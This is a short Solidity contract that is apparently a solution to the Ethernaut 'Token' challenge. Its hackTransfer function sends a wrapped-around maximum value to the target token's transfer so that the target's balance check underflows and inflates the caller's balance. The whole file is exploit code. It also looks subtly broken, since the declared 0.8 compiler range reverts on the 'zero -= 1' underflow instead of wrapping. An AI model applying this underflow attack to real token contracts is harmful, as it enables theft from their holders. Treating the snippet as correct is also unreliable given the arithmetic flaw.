// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <0.9.0;
import "./ethernautToken.sol";

contract HackToken{
    Token public token;
    uint zero = 0;
    constructor(address _token)public{
        token = Token(_token);
    }

    function hackTransfer() public {
        address _address = msg.sender;
        uint256 _value =  zero -= 1;

        token.transfer(_address, _value);
    }

}